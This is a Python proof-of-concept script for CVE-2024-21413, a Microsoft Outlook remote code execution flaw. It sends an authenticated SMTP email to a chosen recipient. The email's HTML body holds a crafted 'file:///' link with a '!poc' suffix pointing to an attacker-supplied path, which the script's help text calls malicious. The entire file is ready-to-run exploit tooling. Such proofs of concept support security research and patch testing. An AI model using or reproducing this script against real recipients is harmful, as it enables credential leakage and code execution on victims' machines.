import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import argparse
import sys

# Define color codes for console output
BLUE = "\033[94m"
GREEN = "\033[92m"
RED = "\033[91m"
ENDC = "\033[0m"

def display_banner():
    """Displays the banner information about the exploit."""
    banner = f"""
{BLUE}CVE-2024-21413 | Microsoft Outlook Remote Code Execution Vulnerability PoC.
Alexander Hagenah / @xaitax / ah@primepage.de{ENDC}
"""
    print(banner)

def send_email(smtp_server, port, username, password, sender_email, recipient_email, link_url, subject):
    """Sends an email with both plain text and HTML parts to exploit the vulnerability.

    Args:
        smtp_server (str): The hostname or IP address of the SMTP server.
        port (int): The port number of the SMTP server.
        username (str): The username for SMTP server authentication.
        password (str): The password for SMTP server authentication.
        sender_email (str): The email address of the sender.
        recipient_email (str): The email address of the recipient.
        link_url (str): The malicious URL to include in the email.
        subject (str): The subject of the email.
    """
    # Create the container (outer) email message.
    msg = MIMEMultipart('alternative')
    msg['Subject'] = subject
    msg['From'] = sender_email
    msg['To'] = recipient_email

    # Plain text and HTML version of the message
    text = "Please read this email in HTML format."
    # Base64 image string and malicious link embedded in HTML
    base64_image_string = "data:image/png;base64, [Base64 Image String]"
    html = f"""\
    <html>
    <body>
        <img src="{base64_image_string}" alt="Image"><br />
        <h1><a href="file:///{link_url}!poc">CVE-2024-21413 PoC.</a></h1>
    </body>
    </html>
    """

    # Attach parts into message container.
    part1 = MIMEText(text, 'plain')
    part2 = MIMEText(html, 'html')
    msg.attach(part1)
    msg.attach(part2)

    # Send the email
    try:
        with smtplib.SMTP(smtp_server, port) as server:
            server.ehlo()
            server.starttls()  # Secure the connection
            server.ehlo()
            server.login(username, password)  # Log in to the server
            server.sendmail(sender_email, recipient_email, msg.as_string())  # Send the email
            print(f"{GREEN}✅ Email sent successfully.{ENDC}")
    except Exception as e:
        print(f"{RED}❌ Failed to send email: {e}{ENDC}")

def main():
    """Main function to parse arguments and initiate email sending."""
    display_banner()
    parser = argparse.ArgumentParser(description="PoC for CVE-2024-21413 with SMTP authentication.")
    parser.add_argument('--server', required=True, help="SMTP server hostname or IP")
    parser.add_argument('--port', type=int, default=587, help="SMTP server port")
    parser.add_argument('--username', required=True, help="SMTP server username for authentication")
    parser.add_argument('--password', required=True, help="SMTP server password for authentication")
    parser.add_argument('--sender', required=True, help="Sender email address")
    parser.add_argument('--recipient', required=True, help="Recipient email address")
    parser.add_argument('--url', required=True, help="Malicious path to include in the email")
    parser.add_argument('--subject', required=True, help="Email subject")

    args = parser.parse_args()

    # Send the email with provided arguments
    send_email(args.server, args.port, args.username, args.password, args.sender, args.recipient, args.url, args.subject)

if __name__ == "__main__":
    # Check if the script was called with no arguments, display the banner and exit
    if len(sys.argv) == 1:
        display_banner()
        sys.exit(1)
    main()
